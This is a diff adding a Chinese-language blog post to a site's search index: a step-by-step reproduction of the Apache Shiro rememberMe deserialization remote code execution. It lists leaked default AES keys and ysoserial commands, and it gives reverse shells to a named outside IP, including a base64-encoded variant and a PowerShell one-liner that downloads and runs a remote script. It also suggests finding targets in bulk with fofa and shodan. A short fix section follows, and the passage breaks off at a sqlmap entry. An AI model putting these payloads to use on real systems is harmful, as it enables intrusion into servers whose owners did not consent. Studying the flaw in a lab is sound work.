@@ -1,6 +1,113 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Apache Shiro反序列化远程代码执行复现</title>
+    <url>/2020/05/08/Apache-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>一、漏洞原理分析</p><pre><code>1、先看下官网漏洞说明https://issues.apache.org/jira/browse/SHIRO-550
+Shiro提供了记住我（RememberMe）的功能，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问
+Shiro对rememberMe的cookie做了加密处理，shiro在CookieRememberMeManaer类中将cookie中rememberMe字段内容分别进行 序列化、AES加密、Base64编码操作。
+2、在识别身份的时候，需要对Cookie里的rememberMe字段解密。根据加密的顺序，不难知道解密的顺序为
+（1）获取rememberMe cookie
+（2）base64 decode
+（3）解密AES
+（4）反序列化
+但是，AES加密的密钥Key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞
+3、AES加密密钥（github、Google可信息搜集到）
+kPH+bIxk5D2deZiIxcaaaA==
+wGiHplamyXlVB11UXWol8g==
+2AvVhdsgUs0FSA3SDFAdag==
+4AvVhmFLUs0KTA3Kprsdag==
+fCq+/xW488hMTCD+cmJ3aQ==
+3AvVhmFLUs0KTA3Kprsdag==
+1QWLxg+NYmxraMoxAXu/Iw==
+ZUdsaGJuSmxibVI2ZHc9PQ==
+Z3VucwAAAAAAAAAAAAAAAA==
+U3ByaW5nQmxhZGUAAAAAAA==
+6ZmI6I2j5Y+R5aSn5ZOlAA==
+。。。。。。。。。。。。。。。
+</code></pre><a id="more"></a>
+
+<p>二、漏洞场景还原</p>
+<pre><code>方法一：
+git clone https://github.com/apache/shiro.git
+git checkout shiro-root-1.2.4
+cd ./shiro/samples/web
+为了配合生成反序列化的漏洞环境，需要添加存在漏洞的 jar 包，编辑 pom.xml 文件，添加如下行
+![upload successful](/images/pasted-50.png)
+修改完成 pom.xml 文件后，开始使用 mvn 进行存在漏洞环境的 war 包进行编译，最终可以将 target 目录下生成的 samples-web-1.2.4.war 文件拷贝至 tomcat 目录下的 webapps 目录
+方法二
+docker pull medicean/vulapps:s_shiro_1
+docker run -d -p 80:8080 medicean/vulapps:s_shiro_1
+![upload successful](/images/pasted-51.png)
+</code></pre>
+<p>三、工具准备</p>
+<pre><code>生成payload的脚本
+![upload successful](/images/pasted-52.png)
+其中有一个模块需要强调，就是安装pycrypto，用来解决报错No module named Crypto.Cipher
+然后，获取我们复现需要用到的ysoserial工具。
+git　clone https://github.com/frohoff/ysoserial.git
+cd ysoserial
+mvn package –DskipTests
+命令
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7878 CommonsCollections5 "ping xxx.dnslog.cn"
+</code></pre>
+<p>四、漏洞利用</p>
+<pre><code>检测方法一
+python shiro.py “ping jx62iq.dnslog.cn”脚本会在同级目录下生成payload
+用payload.cookie中内容替换Cookie中的全部内容，Go
+![upload successful](/images/pasted-54.png)
+dnslog平台查看即可到流量记录
+![upload successful](/images/pasted-53.png)
+检测方法二
+ysoserial监听
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1234 CommonsCollections4 'curl 47.240.61.93:1996'
+此时nc监听1996端口，并且生成新的payload进行rememberMe的cookie替换
+![upload successful](/images/pasted-55.png)
+![upload successful](/images/pasted-56.png)
+反弹shell
+制作反弹shell代码
+bash -i >& /dev/tcp/47.240.61.93/1996 0>&1
+然后进行Java反序列化绕过 base64编码
+http://www.jackson-t.ca/runtime-exec-payloads.html
+![upload successful](/images/pasted-57.png)
+ysoserial监听
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1234 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4yNDAuNjEuOTMvODAzMCAwPiYxCgo=}|{base64,-d}|{bash,-i}'
+此时nc监听1996端口，并且生成新的payload进行rememberMe的cookie替换
+![upload successful](/images/pasted-58.png)
+![upload successful](/images/pasted-59.png)
+![upload successful](/images/pasted-60.png)
+至此, 复现完成, 整个漏洞复现流程:
+使用poc.py生成payload-->将payload放入cookie中请求服务器-->服务器触发payload去执行VPS上监听端口1上的命令-->反弹shell命令执行-->VPS监听端口2得到shell成功
+</code></pre>
+<p>五、其他利用姿势<br>如果有漏洞会返回信息，如果没有漏洞就没有返回信息，配合fofa可实现批量“杀鸡”<br><img src="/images/pasted-61.png" alt="upload successful"><br>使用网络空间搜索引擎，例如shadon、zoomeye、fofa等等进行扫描<br>使用fofa 搜索 title=”apache shiro *” 或者 app=”jeesite”，全是apache shiro的<br><img src="/images/pasted-62.png" alt="upload successful"><br>六、漏洞修复</p>
+<pre><code>1.对于shiro的认证过程而言，如果我们使用了硬编码的默认密钥，或者我们自己配置的AES密钥一旦泄露，都有可能面临着反序列化漏洞的风险，因此可以选择不配置硬编码的密钥，那么此情况下shiro将会为我们每次生成一个随机密钥
+2.若需要自己生成密钥，官方提供org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()方法来进行AES的密钥生成
+</code></pre>
+<p>七、复现总结</p>
+<pre><code>
+1、测试时, 首先需要对网站基本信息有一个收集, 要知道它是什么系统, linux与windows反弹shell的命令不同
+linux(需要编码处理): bash -i >& /dev/tcp/127.0.0.1/8888 0>&1
+windwos(不需要编码处理): powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 127.0.0.1 -port 8888
+2、响应包中出现<rememberme=deleteme>可以用来大概判断是否使用了Shiro.
+3、测试时, 最好先使用ping命令用来检测漏洞是否存在, 因为复杂的命令可能因为各种原因执行失败, 影响判断
+4、关于利用模块的选择, 最开始在docker上复现时, 我使用的是CommonsCollections4, 都能成功, 但到了实际环境中, 反弹shell不一定成功，可以试试其他模块CommonsCollections1, CommonsCollections3, CommonsCollections5
+</rememberme=deleteme></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+  </entry>
+  <entry>
     <title>sqlmap详解</title>
     <url>/2020/01/13/sqlmap%E8%AF%A6%E8%A7%A3/</url>
     <content><![CDATA[<p>1、sqlmap的简单用法</p><pre><code>sqlmap -r http.txt  #http.txt是我们抓取的http的请求包
